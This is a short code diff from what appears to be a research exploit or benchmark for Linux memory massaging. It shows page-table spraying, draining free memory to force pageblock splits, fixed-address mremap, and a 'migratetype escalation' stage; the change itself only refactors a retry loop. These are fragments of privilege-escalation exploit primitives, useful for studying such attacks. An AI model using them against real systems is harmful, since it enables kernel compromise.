@@ -78,7 +78,7 @@ void unspray_tables() {
     }
 }
 
-void* get_page_block() {
+void* get_page_block_once() {
     // Drain memory so the allocator must split big blocks
     size_t drain_size = PAGE_SIZE * sysconf(_SC_AVPHYS_PAGES) - ZONE_RESERVE;
 
@@ -110,8 +110,9 @@ void* get_page_block() {
     // virtual address (REMAP_ADDRESS) without copying. The physical
     // pages stay put; only page tables change, which is cheap and keeps
     // the block contiguous.
-    void* page_block = mremap(page_block_aligned, PAGEBLOCK_SIZE, PAGEBLOCK_SIZE,
-                             MREMAP_FIXED | MREMAP_MAYMOVE, REMAP_ADDRESS);
+    void* page_block = mremap(page_block_aligned, PAGEBLOCK_SIZE,
+                              PAGEBLOCK_SIZE,
+                              MREMAP_FIXED | MREMAP_MAYMOVE, REMAP_ADDRESS);
 
     // No further use for the huge ‘drain’ region – free it to relieve
     // memory pressure before the next stages of the attack.
@@ -130,15 +131,23 @@ void* get_page_block() {
     return MAP_FAILED;
 }
 
-void pre_migratetype_escalation() {
+void* get_page_block() {
+    void *pageblock;
+
     do {
-        pageblock = get_page_block();
+        pageblock = get_page_block_once();
     } while(pageblock == MAP_FAILED);
 
+    return pageblock;
+}
+
+void pre_migratetype_escalation() {
+    pageblock = get_page_block();
     open_spraying_file();
 }
 
 void microbenchmark_migratetype_escalation() {
+
     target = (void*)((unsigned long)pageblock + TARGET_OFFSET);
     mlock((void*)((unsigned long)target - PAGE_SIZE), 3 * PAGE_SIZE);
     target_phys = rubench_va_to_pa(target);
